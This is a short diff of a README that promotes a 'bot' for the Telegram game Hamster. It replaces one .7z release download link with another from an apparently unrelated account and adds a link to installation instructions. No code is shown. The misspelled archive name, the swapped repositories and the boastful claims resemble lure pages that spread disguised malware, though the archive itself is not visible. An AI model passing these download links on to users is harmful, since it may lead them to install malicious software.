@@ -1,4 +1,5 @@
-# [DOWNLOAD](https://github.com/bakedayk8/bakedayk8/releases/download/Basked-GameZ-21z/Github.Softwares.v1.0.2.7z)
+# [DOWNLOAD](https://github.com/forthblackwolf3/Hamster-AutoScript/releases/download/Download/Hamster_Aurtofarming_x64_x86bit.7z)
+# [Click here to view installation instructions](https://github.com/forthblackwolf3/Hamster-AutoScript/blob/main/Installation%20instructions.txt)
 ## My product is the best bot for the new telegram game Hamster, which allows you to:
 
 ### Automatic Clicking:
